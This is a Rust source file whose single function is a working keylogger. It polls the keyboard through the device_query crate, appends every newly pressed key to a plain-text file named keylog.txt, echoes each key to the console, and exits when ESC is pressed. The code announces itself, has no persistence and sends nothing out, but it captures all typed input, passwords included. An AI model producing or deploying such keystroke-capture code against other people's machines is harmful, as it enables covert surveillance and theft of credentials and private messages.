use device_query::{DeviceQuery, DeviceState, Keycode};
use std::fs::OpenOptions;
use std::io::Write;

pub fn keylogger() {
    // Open or create the log file
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open("keylog.txt")
        .expect("Failed to open log file");

    println!("Keylogger started. Press 'ESC' to exit.");

    let mut last_keys = vec![];

    let device_state = DeviceState::new();

    loop {
        // Get the list of currently pressed keys
        let keys = device_state.get_keys();

        // Detect and log newly pressed keys
        for key in keys.iter() {
            if !last_keys.contains(key) {
                let key_string = match key {
                    Keycode::Enter => "\n".to_string(),   // Enter key
                    Keycode::Space => " ".to_string(),    // Space key
                    Keycode::Tab => "[Tab]".to_string(),  // Tab key
                    Keycode::LShift | Keycode::RShift => "[Shift]".to_string(), // Shift keys
                    Keycode::Escape => "[ESC]".to_string(), // ESC key
                    _ => format!("{:?}", key), // Any other key
                };

                // Write the detected key to the log file
                if let Err(e) = writeln!(file, "{}", key_string) {
                    eprintln!("Failed to write to log file: {}", e);
                }

                // Flush the file to ensure data is saved
                if let Err(e) = file.flush() {
                    eprintln!("Failed to flush log file: {}", e);
                }

                // Print the key for debugging
                println!("Key Pressed: {}", key_string);
            }
        }

        // Check if ESC key is pressed to exit
        if keys.contains(&Keycode::Escape) {
            break;
        }

        // Update the last keys pressed
        last_keys = keys;
    }

    println!("Keylogger stopped.");
}
